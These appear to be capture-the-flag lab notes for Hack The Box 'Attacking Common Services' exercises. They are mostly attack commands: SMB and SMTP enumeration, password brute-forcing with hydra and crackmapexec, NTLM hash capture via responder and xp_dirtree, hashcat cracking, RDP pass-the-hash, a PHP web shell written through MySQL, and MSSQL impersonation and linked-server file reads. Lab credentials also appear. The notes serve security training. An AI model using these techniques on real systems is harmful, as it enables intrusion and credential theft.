# Attacking SMB

What is the name of the shared folder with READ permissions? 

```bash
smbclient -N -L //10.129.90.178

```
What is the password for the username "jason"? 

```bash
crackmapexec smb 10.129.90.178 -u jason -p pws.list --local-auth 

```
Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer. 
`
```bash
smbclient //10.129.90.178/GGJ -U jason 
get id_rsa

chmod 600 id_rsa
ssh -i id_rsa jason@10.129.90.178 

```

# Attacking SQL Databases

What is the password for the "mssqlsvc" user? 

```bash 

sudo responder -I tun0

EXEC master..xp_dirtree '\\10.10.14.42\share\'

echo "mssqlsvc::WIN-02:e55a1af3bd0a5430:4E37C6C4684FD62B450396D1B5CB12FB:010100000000000000ADF630B8CDDA01110DA954EB27FCD40000000002000800460037004800560001001E00570049004E002D00440049004A00500053004E005800590058004500380004003400570049004E002D00440049004A00500053004E00580059005800450038002E0046003700480056002E004C004F00430041004C000300140046003700480056002E004C004F00430041004C000500140046003700480056002E004C004F00430041004C000700080000ADF630B8CDDA01060004000200000008003000300000000000000000000000003000009426025E122E43385D0BB2D9444B039C658C9C9BCB62AF2BAC3890DB8A6FF3C80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340032000000000000000000" > hash2.txt

hashcat -m 5600 -a 0 hash2.txt /home/avataris12/CTF/CTF_2023/desconstru_ctf/Forensics/Hash_Roll/rockyou.txt


```


Enumerate the "flagDB" database and submit a flag as your answer. 

```bash

python3 mssqlclient.py -p 1433 mssqlsvc@10.129.239.58 -windows-auth

Select name from sys.databases;
use flagDB
Select * from sys.tables;
Select * from tb_flag;

```

# Attacking RDP

What is the name of the file that was left on the Desktop? (Format example: filename.txt) 

```bash

rdesktop -u htb-rdp -p HTBRocks! 10.129.203.13

```

Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol? 

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

```

Connect via RDP with the Administrator account and submit the flag.txt as you answer. 

```bash
# /pth is a NTML hash
xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824

```
# Attacking DNS

```bash 

nslookup -type=NS inlanefreight.htb 10.129.90.178

echo "ns1.inlanefreight.htb" > ./resolvers.txt

python3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt


dig AXFR @ns1.inlanefreight.htb hr.inlanefreight.htb


```


# Attacking Email Services

What is the available username for the domain inlanefreight.htb in the SMTP server? 

```bash

smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.156.13
# marlin@inlanefreight.htb

hydra -l marlin@inlanefreight.htb -P pws.list pop3//10.129.203.12 -w 60
# login: marlin@inlanefreight.htb   password: poohbear

telnet 10.129.203.12 110

 USER marlin@inlanefreight.htb
 PASS poohbear
 list
 retr 1

```


Access the email account using the user credentials that you discovered and submit the flag in the email as your answer. 

```bash


```

# Attacking Common Services - Easy
You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer. 

```bash

smtp-user-enum -M RCPT -U users.list -t <ip> -D inlanefreight.htb

sudo hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.153.232 -v -t 8 -I -f

mysql -u 'fiona' -p'987654321' -h 10.129.153.232

SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/webshell.php'

http://10.129.153.232/webshell.php?cmd=type+C:\Users\Administrator\Desktop\flag.txt


```

# Attacking Common Services - Medium

Assess the target server and find the flag.txt file. Submit the contents of this file as your answer. 

```bash 
rustscan -a 10.129.230.131 --range 1-65535 --ulimit 10000

ftp 10.129.201.127 -P 30021

get mynotes.txt

hydra -l simon -P mynotes.txt ssh://10.129.201.127


```

# Attacking Common Services - Hard

What file can you retrieve that belongs to the user "simon"? (Format: filename.txt) 

```bash

crackmapexec smb 10.129.203.10  -u users.list -p pws.list --local-auth

smbclient -N -L //10.129.203.10

smbclient \\\\10.129.203.10\\Home

cd IT/Fiona
get creds.txt
cd Simon
get random.txt
# get the files of john too

```

Enumerate the target and find a password for the user Fiona. What is her password? 

```bash

hydra -l Fiona -P creds.txt 10.129.203.10 rdp

```

Once logged in, what other user can we compromise to gain admin privileges? 
Submit the contents of the flag.txt file on the Administrator Desktop.

```bash
rdesktop -u Fiona -p '48Ns72!bns74@S84NNNSl' 10.129.203.10

sqlcmd

1> execute as login = 'john'
2> select system_user
3> select is_srvrolemember('sysadmin')
4> go

1> select srvname, isremote from sysservers
2> go

1> execute('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') at [local.test.linked.srv]
2> go

1> execute('select * from openrowset(bulk ''C:/Users/Administrator/desktop/flag.txt'', single_clob)as contents') at [local.test.linked.srv]
2> go

```
